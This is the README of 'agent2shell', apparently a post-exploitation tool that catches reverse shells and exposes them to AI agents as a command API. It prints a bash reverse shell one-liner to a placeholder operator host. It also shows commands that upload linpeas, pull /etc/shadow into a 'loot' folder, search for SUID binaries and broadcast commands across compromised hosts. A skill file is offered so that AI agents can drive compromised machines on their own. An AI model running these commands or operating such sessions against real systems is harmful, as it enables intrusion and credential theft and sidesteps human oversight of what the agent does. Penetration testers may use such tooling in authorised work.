# agent2shell

Programmable reverse shell interface for AI agents and automation.

Catches reverse shell connections over TCP, exposes them as structured JSON APIs via Unix domain sockets. AI agents, scripts, and CLI tools can execute commands, transfer files, and query session metadata — clean output, exit codes, timeouts.

## Quick Start

```bash
# Build
make build

# Terminal 1: catch a reverse shell
agent2shell catch -p 4444

# Target sends reverse shell
bash -i >& /dev/tcp/OPERATOR_IP/4444 0>&1

# Terminal 2: send commands
agent2shell run whoami
agent2shell run uname -a
agent2shell status
agent2shell push ./linpeas.sh /tmp/linpeas.sh
agent2shell pull /etc/shadow ./loot/shadow
```

## Architecture

```
Target (reverse shell) ──TCP:4444──→ agent2shell catch ──Unix socket──→ AI agent / CLI
                                          │
                                    /tmp/a2s-1.sock
                                          │
                                    agent2shell run
                                    agent2shell status
                                    agent2shell push/pull
```

The operator runs `catch` to listen for a reverse shell. On connection, a Unix domain socket is created. Any process on the same machine can send commands through the socket.

## Commands

### catch

Catches a reverse shell and serves the Unix socket API. The operator can also type commands directly in the terminal.

```bash
agent2shell catch -p 4444
agent2shell catch -p 4444 --tag webserver
agent2shell catch -p 4444 --log /tmp/engagement.jsonl
agent2shell catch -p 4444 --auto-upgrade
```

Flags:
- `-p, --port` — TCP port (default 4444)
- `-H, --host` — bind address (default 0.0.0.0)
- `-t, --timeout` — per-command timeout (default 30s)
- `--tag` — session label for broadcast/list filtering
- `--log` — JSONL file for recording all exec commands
- `--auto-upgrade` — attempt sh → bash upgrade on connect

### run

Execute a command on the target.

```bash
agent2shell run whoami
agent2shell run ls -la /tmp
agent2shell run -t 60 "find / -perm -4000 2>/dev/null"
```

Exit codes 0-125 are forwarded from the remote command. Exit 126 means agent2shell error.

### status

Session metadata.

```bash
agent2shell status
agent2shell status --json
```

```
Remote:      10.0.1.5:48230
Shell:       bash
User:        www-data
Hostname:    target-web-01
OS:          linux
Arch:        amd64
Distro:      Ubuntu 22.04
Connected:   2026-04-23T10:30:00Z (5m ago)
Commands:    12
Recording:   yes
```

### list

List all active sessions.

```bash
agent2shell list
agent2shell list --json
```

### push / pull

File transfer via base64 chunking with MD5 checksum verification.

```bash
agent2shell push ./linpeas.sh /tmp/linpeas.sh
agent2shell pull /etc/shadow ./loot/shadow
```

Auto-detects available decoder on target: base64, openssl, python3, perl.

### broadcast

Execute a command across multiple sessions.

```bash
agent2shell broadcast --all whoami
agent2shell broadcast --tag webserver "ss -tlnp"
agent2shell broadcast --all --json id
```

### Targeting a specific session

When multiple sessions are active, use `-s` before the subcommand:

```bash
agent2shell -s /tmp/a2s-2.sock run whoami
agent2shell -s /tmp/a2s-2.sock status
```

Without `-s`, agent2shell auto-discovers. One session = used automatically. Multiple = error asking you to specify.

## Session Recording

Log all programmatic exec commands to a JSONL file:

```bash
agent2shell catch -p 4444 --log /tmp/engagement.jsonl
```

Each command produces one line:

```json
{"timestamp":"2026-04-23T14:21:56Z","command":"whoami","output":"ec2-user","exit_code":0,"duration_ms":2}
```

## Remote Access via SSH Tunnel

Run agent2shell on a remote server and control it from your laptop:

```
Target ──reverse shell──→ EC2 (agent2shell catch) ←──SSH tunnel── Your laptop
```

```bash
# On EC2: start listener
./agent2shell catch -p 4444

# Target connects to EC2:4444

# On your laptop: forward the Unix socket
ssh -NL /tmp/a2s-ec2.sock:/tmp/a2s-1.sock -i key.pem user@EC2_IP

# Use agent2shell locally
agent2shell -s /tmp/a2s-ec2.sock run whoami
agent2shell -s /tmp/a2s-ec2.sock status
agent2shell -s /tmp/a2s-ec2.sock push ./tool /tmp/tool
```

See `scripts/ec2-create.sh` for automated EC2 lab setup.

## AI Agent Integration

Copy `skills/ai-agent-usage.md` to your agent's instruction directory:

```bash
cp skills/ai-agent-usage.md ~/.claude/skills/
```

Claude Code (or any AI agent that reads skill files) will know how to use agent2shell autonomously — executing commands, uploading tools, downloading files, querying session state.

## Installation

```bash
# From source
git clone https://github.com/0xmagic0/agent2shell.git
cd agent2shell
make build
# Binary: ./agent2shell

# Or go install
go install github.com/0xmagic0/agent2shell/cmd/agent2shell@latest
```

Requires Go 1.22+. Single static binary, zero runtime dependencies.

## Building

```bash
make build              # Static binary
make test               # Unit tests with -race
make test-integration   # Integration tests
make test-e2e           # End-to-end tests
make lint               # golangci-lint
make fmt                # gofmt + goimports
```

## Design

- **Not a C2 framework.** A shell interface. Catches shells, makes them programmable.
- **Not an AI agent.** A clean bridge. Any agent connects through the socket.
- **No embedded transport security.** Use SSH tunnels or VPNs.
- **Unix sockets for IPC.** Fast, no HTTP overhead, works with SSH forwarding.
- **Double-marker protocol.** Start + end markers with UUID for reliable command boundaries.

## License

[MIT](LICENSE)
